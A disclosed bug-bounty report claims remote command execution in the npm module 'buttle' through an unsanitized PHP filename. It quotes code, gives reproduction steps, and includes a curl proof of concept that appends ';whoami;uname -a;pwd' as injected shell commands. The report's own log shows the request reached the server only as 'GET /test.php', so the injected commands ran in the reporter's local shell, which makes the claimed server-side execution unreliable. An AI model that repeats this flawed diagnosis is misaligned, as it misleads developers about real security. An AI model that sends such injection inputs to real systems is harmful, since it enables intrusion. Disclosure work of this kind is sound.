# [buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag

## Report Details
- **Report ID**: 331032
- **URL**: https://hackerone.com/reports/331032
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-03-29T10:43:09.761Z
- **Disclosed**: 2018-05-11T15:52:15.524Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Remote Code Execution in buttle module.

When buttle is run with ```--php-bin``` option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands.

# Module

**module name:** buttle
**version:** 0.2.0
**npm page:** https://www.npmjs.com/package/buttle

## Module Description

Simple static file (+ markdown) server.


## Module Stats

Stats:

N/A, estimated ~20-40 downloads/week

# Vulnerability

## Vulnerability Description

When buttle is run with ```--php-bin``` option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands. This is possible due to this code:

```javascript
// ./node_modules/buttle/lib/mid-php.js, line 15

    var phpFile = norm(join(docroot, req.url));
    fs.exists(phpFile, function(exists) {
    if(exists) {
        res.setHeader('Content-Type', 'text/html');

        var cp = require('child_process').spawn(phpBin, [phpFile]);

        cp.stdout.on('data', function(data) {
        res.write(data);
        });

        cp.stderr.on('data', function(data) {
        res.write(data);
        });

        cp.on('close', function() {
        res.end('');
        });

    } else {
```

As you can notice, ```spawn()``` method is called with PHP file as an argument, but no sanitization is apllied on ```phpFile``` variable. Using ```curl```, I was able to pass example PHP filename concatenated with ```;[shell cmd]``` string, which allows me to execute command on the server.


## Steps To Reproduce:

- install ```buttle```:

```
$ npm i buttle
```

- create ```test.php``` file with folloing content:

```php
<?php
echo 'Its working!';
?>

```

- run buttle with PHP support:

```
$ ./node_modules/buttle/bin/buttle -p 8080 --php-bin /usr/bin/php
Listening on port 8080
```

- execute following command in the console:

```
$ curl -v --path-as-is http://localhost:8080/test.php;whoami;uname -a;pwd;echo "uh oh, RCE :P"
```

- see response from the server containing results of execution of injected commands:

```
*   Trying ::1...
* Connected to localhost (::1) port 8080 (#0)
> GET /test.php HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: text/html
< Date: Thu, 29 Mar 2018 10:35:22 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
* Connection #0 to host localhost left intact
Its working!rafal.janicki
Linux LT0081U2 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
/home/rafal.janicki/playground/hackerone/Node
uh oh, RCE :P
```


## Patch

```phpFile``` variable should be sanitized. Ideally, it should strip everything what comes after ```.php``` extension in filename and do not allow to use any Bash special characters (like semicolon, pipe, comma etc.)

## Supporting Material/References:


- Operating system: Ubuntu 16.04
- Node.js 8.9.4
- npm v. 5.6.0
- curl v. 7.47.0

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

I hope my report will help to keep Node.js ecosystem and its users safe :)

Regards,

Rafal 'bl4de' Janicki

## Impact

An attacker is able to execute commands on remote server where buttler with --php-bin flag is run.

## Attachments
No attachments
